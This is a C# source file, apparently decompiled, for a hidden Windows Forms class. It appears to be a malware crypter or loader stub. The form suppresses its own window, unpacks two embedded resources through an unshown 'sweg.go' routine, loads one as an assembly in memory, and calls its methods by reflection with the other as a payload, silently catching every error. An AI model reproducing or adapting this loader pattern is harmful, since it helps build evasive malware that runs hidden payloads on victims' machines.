using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Reflection;
using System.Windows.Forms;

public class frmMain : Form
{
	public static Assembly assembly;

	public static string Persistance;

	public static ComponentResourceManager manager = new ComponentResourceManager(typeof(frmMain));

	public frmMain()
	{
		assembly = Assembly.Load(GetResource("b"));
		InitializeComponent();
		AquireData(new List<object>
		{
			0,
			"",
			GetResource("a"),
			false
		});
	}

	public static void tick_Tick(object sender, EventArgs e)
	{
	}

	private static byte[] GetResource(string ResName)
	{
		byte[] compressed = (byte[])manager.GetObject(ResName);
		object[] array = new object[1] { sweg.go(compressed) };
		return (byte[])array[0];
	}

	protected override void SetVisibleCore(bool value)
	{
		((Form)this).SetVisibleCore(false);
	}

	private void InitializeComponent()
	{
	}

	public static object AquireData(List<object> swag)
	{
		MethodInfo[] methods = assembly.GetTypes()[1].GetMethods();
		MethodInfo[] array = methods;
		foreach (MethodInfo methodInfo in array)
		{
			try
			{
				return methodInfo.Invoke(null, swag.ToArray());
			}
			catch
			{
			}
		}
		return null;
	}
}
